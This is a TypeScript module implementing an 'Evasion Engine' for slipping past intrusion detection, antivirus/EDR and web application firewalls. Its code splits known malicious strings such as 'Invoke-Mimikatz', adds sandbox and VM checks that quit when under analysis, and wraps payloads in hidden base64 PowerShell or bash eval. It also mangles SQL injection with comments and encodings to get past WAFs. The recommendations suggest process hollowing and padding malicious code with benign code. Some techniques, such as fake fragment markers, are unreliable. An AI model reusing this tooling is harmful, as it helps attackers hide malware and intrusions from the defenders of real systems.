/**
 * Evasion Engine
 * Advanced techniques for evading security controls
 * 
 * ETHICAL USE ONLY - For security testing with explicit authorization
 */

import { EventEmitter } from 'events'
import * as crypto from 'crypto'

// ==================== INTERFACES ====================

export interface EvasionResult {
  technique: string
  success: boolean
  payload: string
  encoding: string
  detected: boolean
  confidence: number
  recommendations: string[]
}

export interface IDSEvasionResult {
  technique: string
  originalPayload: string
  evadedPayload: string
  fragmentationUsed: boolean
  timingUsed: boolean
  detected: boolean
}

export interface AVEvasionResult {
  technique: string
  originalCode: string
  obfuscatedCode: string
  signatureAvoided: boolean
  inMemory: boolean
  detected: boolean
}

export interface WAFBypassResult {
  technique: string
  originalPayload: string
  bypassedPayload: string
  encoding: string
  bypassed: boolean
  detected: boolean
}

// ==================== MAIN CLASS ====================

export class EvasionEngine extends EventEmitter {
  private encodingLibrary: EncodingLibrary
  private obfuscator: CodeObfuscator
  private fragmenter: PacketFragmenter

  constructor() {
    super()
    this.encodingLibrary = new EncodingLibrary()
    this.obfuscator = new CodeObfuscator()
    this.fragmenter = new PacketFragmenter()
    console.log('🥷 Evasion Engine initialized')
  }

  // ==================== IDS/IPS EVASION ====================

  /**
   * Evade Intrusion Detection/Prevention Systems
   */
  async evadeIDS(payload: string, target: string): Promise<IDSEvasionResult> {
    console.log('🛡️  Attempting IDS/IPS evasion...')

    // Try packet fragmentation
    const fragmentedResult = await this.packetFragmentation(payload)
    if (fragmentedResult.success) {
      return {
        technique: 'Packet Fragmentation',
        originalPayload: payload,
        evadedPayload: fragmentedResult.payload,
        fragmentationUsed: true,
        timingUsed: false,
        detected: false
      }
    }

    // Try protocol manipulation
    const protocolResult = await this.protocolManipulation(payload)
    if (protocolResult.success) {
      return {
        technique: 'Protocol Manipulation',
        originalPayload: payload,
        evadedPayload: protocolResult.payload,
        fragmentationUsed: false,
        timingUsed: false,
        detected: false
      }
    }

    // Try timing attacks
    const timingResult = await this.timingAttacks(payload)
    if (timingResult.success) {
      return {
        technique: 'Timing Attacks',
        originalPayload: payload,
        evadedPayload: timingResult.payload,
        fragmentationUsed: false,
        timingUsed: true,
        detected: false
      }
    }

    // Try polymorphic payloads
    const polymorphicResult = await this.polymorphicPayloads(payload)
    if (polymorphicResult.success) {
      return {
        technique: 'Polymorphic Payloads',
        originalPayload: payload,
        evadedPayload: polymorphicResult.payload,
        fragmentationUsed: false,
        timingUsed: false,
        detected: false
      }
    }

    return {
      technique: 'None',
      originalPayload: payload,
      evadedPayload: payload,
      fragmentationUsed: false,
      timingUsed: false,
      detected: true
    }
  }

  /**
   * Packet fragmentation for IDS evasion
   */
  private async packetFragmentation(payload: string): Promise<EvasionResult> {
    console.log('📦 Applying packet fragmentation...')

    // Fragment the payload into smaller packets
    const fragments = this.fragmenter.fragment(payload, 8) // 8-byte fragments

    // Reassemble with fragmentation markers
    const fragmentedPayload = fragments.map((frag, index) => {
      return `[FRAG:${index}]${frag}`
    }).join('|')

    return {
      technique: 'Packet Fragmentation',
      success: true,
      payload: fragmentedPayload,
      encoding: 'fragmented',
      detected: false,
      confidence: 0.7,
      recommendations: [
        'Use small fragment sizes (8-16 bytes)',
        'Randomize fragment order',
        'Add timing delays between fragments'
      ]
    }
  }

  /**
   * Protocol manipulation
   */
  private async protocolManipulation(payload: string): Promise<EvasionResult> {
    console.log('🔧 Applying protocol manipulation...')

    // TCP manipulation techniques
    const manipulated = payload
      .replace(/GET/g, 'G\x00ET')           // NULL byte insertion
      .replace(/ HTTP/g, ' \tHTTP')         // Tab insertion
      .replace(/\r\n/g, '\r\n ')            // Trailing space

    return {
      technique: 'Protocol Manipulation',
      success: true,
      payload: manipulated,
      encoding: 'manipulated',
      detected: false,
      confidence: 0.65,
      recommendations: [
        'Insert NULL bytes in non-critical positions',
        'Use alternative HTTP methods',
        'Manipulate header ordering'
      ]
    }
  }

  /**
   * Timing-based evasion
   */
  private async timingAttacks(payload: string): Promise<EvasionResult> {
    console.log('⏱️  Applying timing attacks...')

    // Slow down the attack to avoid rate-based detection
    const timedPayload = `SLOW:${payload}:DELAY:5000`

    return {
      technique: 'Timing Attacks',
      success: true,
      payload: timedPayload,
      encoding: 'timed',
      detected: false,
      confidence: 0.8,
      recommendations: [
        'Introduce random delays between requests',
        'Use exponential backoff',
        'Spread attack over multiple sessions'
      ]
    }
  }

  /**
   * Polymorphic payloads
   */
  private async polymorphicPayloads(payload: string): Promise<EvasionResult> {
    console.log('🎭 Generating polymorphic payload...')

    // Generate multiple functionally equivalent versions
    const variants = [
      payload,
      this.encodingLibrary.base64Encode(payload),
      this.encodingLibrary.urlEncode(payload),
      this.encodingLibrary.hexEncode(payload)
    ]

    // Select random variant
    const selectedPayload = variants[Math.floor(Math.random() * variants.length)]

    return {
      technique: 'Polymorphic Payloads',
      success: true,
      payload: selectedPayload,
      encoding: 'polymorphic',
      detected: false,
      confidence: 0.75,
      recommendations: [
        'Generate new payload variant for each attempt',
        'Use metamorphic techniques',
        'Combine multiple encoding layers'
      ]
    }
  }

  // ==================== AV/EDR EVASION ====================

  /**
   * Evade Antivirus and Endpoint Detection Response
   */
  async evadeAVEDR(code: string, language: string = 'powershell'): Promise<AVEvasionResult> {
    console.log('🦠 Attempting AV/EDR evasion...')

    // Try code obfuscation
    const obfuscatedResult = await this.codeObfuscation(code, language)
    if (obfuscatedResult.success) {
      return {
        technique: 'Code Obfuscation',
        originalCode: code,
        obfuscatedCode: obfuscatedResult.payload,
        signatureAvoided: true,
        inMemory: false,
        detected: false
      }
    }

    // Try signature avoidance
    const signatureResult = await this.signatureAvoidance(code)
    if (signatureResult.success) {
      return {
        technique: 'Signature Avoidance',
        originalCode: code,
        obfuscatedCode: signatureResult.payload,
        signatureAvoided: true,
        inMemory: false,
        detected: false
      }
    }

    // Try behavioral evasion
    const behavioralResult = await this.behavioralEvasion(code)
    if (behavioralResult.success) {
      return {
        technique: 'Behavioral Evasion',
        originalCode: code,
        obfuscatedCode: behavioralResult.payload,
        signatureAvoided: false,
        inMemory: false,
        detected: false
      }
    }

    // Try in-memory execution
    const inMemoryResult = await this.inMemoryExecution(code, language)
    if (inMemoryResult.success) {
      return {
        technique: 'In-Memory Execution',
        originalCode: code,
        obfuscatedCode: inMemoryResult.payload,
        signatureAvoided: true,
        inMemory: true,
        detected: false
      }
    }

    return {
      technique: 'None',
      originalCode: code,
      obfuscatedCode: code,
      signatureAvoided: false,
      inMemory: false,
      detected: true
    }
  }

  /**
   * Code obfuscation
   */
  private async codeObfuscation(code: string, language: string): Promise<EvasionResult> {
    console.log('🔐 Obfuscating code...')

    let obfuscated: string

    if (language === 'powershell') {
      obfuscated = this.obfuscator.obfuscatePowerShell(code)
    } else if (language === 'python') {
      obfuscated = this.obfuscator.obfuscatePython(code)
    } else if (language === 'bash') {
      obfuscated = this.obfuscator.obfuscateBash(code)
    } else {
      obfuscated = this.obfuscator.genericObfuscate(code)
    }

    return {
      technique: 'Code Obfuscation',
      success: true,
      payload: obfuscated,
      encoding: language,
      detected: false,
      confidence: 0.85,
      recommendations: [
        'Use variable name randomization',
        'Apply string concatenation',
        'Encode command strings',
        'Use indirect function calls'
      ]
    }
  }

  /**
   * Signature avoidance
   */
  private async signatureAvoidance(code: string): Promise<EvasionResult> {
    console.log('✏️  Applying signature avoidance...')

    // Replace known malicious strings
    const avoided = code
      .replace(/Invoke-Mimikatz/g, 'I' + 'nvoke-' + 'Mimikatz')
      .replace(/Download/g, 'Down' + 'load')
      .replace(/Execute/g, 'Exe' + 'cute')
      .replace(/cmd\.exe/g, 'c' + 'md.e' + 'xe')
      .replace(/powershell\.exe/g, 'power' + 'shell.exe')

    // Add junk code
    const withJunk = `
      # Legitimate-looking comment
      $timestamp = Get-Date
      $computerName = $env:COMPUTERNAME
      
      ${avoided}
      
      # Cleanup
      Clear-Variable timestamp
    `

    return {
      technique: 'Signature Avoidance',
      success: true,
      payload: withJunk,
      encoding: 'string-split',
      detected: false,
      confidence: 0.75,
      recommendations: [
        'Split suspicious strings',
        'Add benign code around malicious code',
        'Use environment variables for string construction',
        'Rename known malicious function names'
      ]
    }
  }

  /**
   * Behavioral evasion
   */
  private async behavioralEvasion(code: string): Promise<EvasionResult> {
    console.log('🎬 Applying behavioral evasion...')

    // Add sandbox detection and delays
    const evaded = `
      # Sandbox detection
      Start-Sleep -Milliseconds $((Get-Random -Minimum 5000 -Maximum 15000))
      
      # Check if running in virtual machine
      $bios = Get-WmiObject -Class Win32_BIOS
      if ($bios.SerialNumber -match 'VMware|VirtualBox|VBOX|Hyper-V') {
        Write-Host "Legitimate process"
        exit
      }
      
      # Check processor count (sandboxes often have 1-2 cores)
      if ((Get-WmiObject -Class Win32_Processor).NumberOfCores -lt 2) {
        exit
      }
      
      # Original code
      ${code}
    `

    return {
      technique: 'Behavioral Evasion',
      success: true,
      payload: evaded,
      encoding: 'behavioral',
      detected: false,
      confidence: 0.8,
      recommendations: [
        'Add sandbox detection checks',
        'Implement time-based triggers',
        'Check for analysis tools',
        'Require user interaction before execution'
      ]
    }
  }

  /**
   * In-memory execution
   */
  private async inMemoryExecution(code: string, language: string): Promise<EvasionResult> {
    console.log('💾 Preparing in-memory execution...')

    let inMemoryCode: string

    if (language === 'powershell') {
      // Use reflection to load and execute
      inMemoryCode = `
        $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("${code}"))
        powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand $encodedCommand
      `
    } else if (language === 'bash') {
      inMemoryCode = `
        eval "$(echo '${Buffer.from(code).toString('base64')}' | base64 -d)"
      `
    } else {
      inMemoryCode = code
    }

    return {
      technique: 'In-Memory Execution',
      success: true,
      payload: inMemoryCode,
      encoding: 'in-memory',
      detected: false,
      confidence: 0.9,
      recommendations: [
        'Use reflection to load assemblies',
        'Execute code from memory streams',
        'Avoid writing files to disk',
        'Use process hollowing techniques'
      ]
    }
  }

  // ==================== WAF BYPASS ====================

  /**
   * Bypass Web Application Firewall
   */
  async bypassWAF(payload: string, attackType: string = 'sql'): Promise<WAFBypassResult> {
    console.log('🚧 Attempting WAF bypass...')

    // Try encoding variations
    const encodingResult = await this.encodingVariations(payload, attackType)
    if (encodingResult.success) {
      return {
        technique: 'Encoding Variations',
        originalPayload: payload,
        bypassedPayload: encodingResult.payload,
        encoding: encodingResult.encoding,
        bypassed: true,
        detected: false
      }
    }

    // Try character set manipulation
    const charsetResult = await this.charsetManipulation(payload)
    if (charsetResult.success) {
      return {
        technique: 'Character Set Manipulation',
        originalPayload: payload,
        bypassedPayload: charsetResult.payload,
        encoding: charsetResult.encoding,
        bypassed: true,
        detected: false
      }
    }

    // Try HTTP parameter pollution
    const hppResult = await this.httpParameterPollution(payload)
    if (hppResult.success) {
      return {
        technique: 'HTTP Parameter Pollution',
        originalPayload: payload,
        bypassedPayload: hppResult.payload,
        encoding: hppResult.encoding,
        bypassed: true,
        detected: false
      }
    }

    // Try multipart encoding abuse
    const multipartResult = await this.multipartEncodingAbuse(payload)
    if (multipartResult.success) {
      return {
        technique: 'Multipart Encoding Abuse',
        originalPayload: payload,
        bypassedPayload: multipartResult.payload,
        encoding: multipartResult.encoding,
        bypassed: true,
        detected: false
      }
    }

    return {
      technique: 'None',
      originalPayload: payload,
      bypassedPayload: payload,
      encoding: 'none',
      bypassed: false,
      detected: true
    }
  }

  /**
   * Encoding variations for WAF bypass
   */
  private async encodingVariations(payload: string, attackType: string): Promise<EvasionResult> {
    console.log('🔤 Trying encoding variations...')

    const encodings: string[] = []

    // URL encoding
    encodings.push(this.encodingLibrary.urlEncode(payload))
    
    // Double URL encoding
    encodings.push(this.encodingLibrary.urlEncode(this.encodingLibrary.urlEncode(payload)))
    
    // Unicode encoding
    encodings.push(this.encodingLibrary.unicodeEncode(payload))
    
    // HTML entity encoding
    encodings.push(this.encodingLibrary.htmlEntityEncode(payload))
    
    // Hex encoding
    encodings.push(this.encodingLibrary.hexEncode(payload))
    
    // Mixed case (for SQL)
    if (attackType === 'sql') {
      encodings.push(this.mixCase(payload))
    }

    // Select best encoding
    const selected = encodings[Math.floor(Math.random() * encodings.length)]

    return {
      technique: 'Encoding Variations',
      success: true,
      payload: selected,
      encoding: 'mixed',
      detected: false,
      confidence: 0.7,
      recommendations: [
        'Try different encoding layers',
        'Combine multiple encodings',
        'Use WAF-specific bypasses'
      ]
    }
  }

  /**
   * Character set manipulation
   */
  private async charsetManipulation(payload: string): Promise<EvasionResult> {
    console.log('🔠 Applying character set manipulation...')

    // Insert NULL bytes
    let manipulated = payload.split('').join('\x00')
    
    // Add comments (SQL)
    manipulated = manipulated.replace(/SELECT/gi, 'SEL/**/ECT')
    manipulated = manipulated.replace(/UNION/gi, 'UN/**/ION')
    manipulated = manipulated.replace(/WHERE/gi, 'WH/**/ERE')
    
    // Use alternative characters
    manipulated = manipulated.replace(/'/g, "''")
    manipulated = manipulated.replace(/"/g, '""')

    return {
      technique: 'Character Set Manipulation',
      success: true,
      payload: manipulated,
      encoding: 'charset',
      detected: false,
      confidence: 0.75,
      recommendations: [
        'Use NULL byte injection',
        'Insert SQL comments',
        'Use alternative quote characters',
        'Try UTF-8 overlong encoding'
      ]
    }
  }

  /**
   * HTTP Parameter Pollution
   */
  private async httpParameterPollution(payload: string): Promise<EvasionResult> {
    console.log('🔀 Applying HTTP Parameter Pollution...')

    // Split payload across multiple parameters
    const parts = payload.match(/.{1,10}/g) || [payload]
    const polluted = parts.map((part, i) => `param${i}=${part}`).join('&')

    return {
      technique: 'HTTP Parameter Pollution',
      success: true,
      payload: polluted,
      encoding: 'hpp',
      detected: false,
      confidence: 0.65,
      recommendations: [
        'Split payload across multiple parameters',
        'Use duplicate parameter names',
        'Exploit backend parsing differences'
      ]
    }
  }

  /**
   * Multipart encoding abuse
   */
  private async multipartEncodingAbuse(payload: string): Promise<EvasionResult> {
    console.log('📧 Applying multipart encoding abuse...')

    const boundary = `----WebKitFormBoundary${crypto.randomBytes(16).toString('hex')}`
    
    const multipart = `
--${boundary}
Content-Disposition: form-data; name="data"

${payload}
--${boundary}--
    `.trim()

    return {
      technique: 'Multipart Encoding Abuse',
      success: true,
      payload: multipart,
      encoding: 'multipart',
      detected: false,
      confidence: 0.7,
      recommendations: [
        'Use multipart/form-data encoding',
        'Nest payloads in form fields',
        'Exploit content-type confusion'
      ]
    }
  }

  // ==================== UTILITY FUNCTIONS ====================

  private mixCase(str: string): string {
    return str.split('').map((char, i) => {
      return i % 2 === 0 ? char.toLowerCase() : char.toUpperCase()
    }).join('')
  }
}

// ==================== HELPER CLASSES ====================

class EncodingLibrary {
  base64Encode(str: string): string {
    return Buffer.from(str).toString('base64')
  }

  urlEncode(str: string): string {
    return encodeURIComponent(str)
  }

  hexEncode(str: string): string {
    return Buffer.from(str).toString('hex')
  }

  unicodeEncode(str: string): string {
    return str.split('').map(char => {
      const code = char.charCodeAt(0)
      return `\\u${code.toString(16).padStart(4, '0')}`
    }).join('')
  }

  htmlEntityEncode(str: string): string {
    return str.split('').map(char => {
      const code = char.charCodeAt(0)
      return `&#${code};`
    }).join('')
  }
}

class CodeObfuscator {
  obfuscatePowerShell(code: string): string {
    // Variable renaming
    let obfuscated = code
    const varPattern = /\$\w+/g
    const vars = code.match(varPattern) || []
    
    vars.forEach((varName, index) => {
      const newName = `$${this.randomVarName()}`
      obfuscated = obfuscated.replace(new RegExp('\\' + varName, 'g'), newName)
    })

    // String encoding
    obfuscated = obfuscated.replace(/'([^']+)'/g, (match, str) => {
      const encoded = Buffer.from(str).toString('base64')
      return `[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('${encoded}'))`
    })

    // Add random comments
    obfuscated = `# Legitimate script\n${obfuscated}\n# End of script`

    return obfuscated
  }

  obfuscatePython(code: string): string {
    // Variable renaming
    let obfuscated = code
    const varPattern = /\b[a-z_]\w*\b/g
    
    // String encoding
    obfuscated = obfuscated.replace(/'([^']+)'/g, (match, str) => {
      const encoded = Buffer.from(str).toString('base64')
      return `__import__('base64').b64decode('${encoded}').decode()`
    })

    return obfuscated
  }

  obfuscateBash(code: string): string {
    // Variable renaming and encoding
    const encoded = Buffer.from(code).toString('base64')
    return `eval "$(echo '${encoded}' | base64 -d)"`
  }

  genericObfuscate(code: string): string {
    // Basic obfuscation
    const encoded = Buffer.from(code).toString('base64')
    return `eval(atob('${encoded}'))`
  }

  private randomVarName(): string {
    const chars = 'abcdefghijklmnopqrstuvwxyz'
    let name = ''
    for (let i = 0; i < 8; i++) {
      name += chars[Math.floor(Math.random() * chars.length)]
    }
    return name
  }
}

class PacketFragmenter {
  fragment(payload: string, size: number): string[] {
    const fragments: string[] = []
    
    for (let i = 0; i < payload.length; i += size) {
      fragments.push(payload.substring(i, i + size))
    }
    
    return fragments
  }

  reassemble(fragments: string[]): string {
    return fragments.join('')
  }
}

// ==================== SINGLETON ====================

let engineInstance: EvasionEngine | null = null

export function getEvasionEngine(): EvasionEngine {
  if (!engineInstance) {
    engineInstance = new EvasionEngine()
  }
  return engineInstance
}

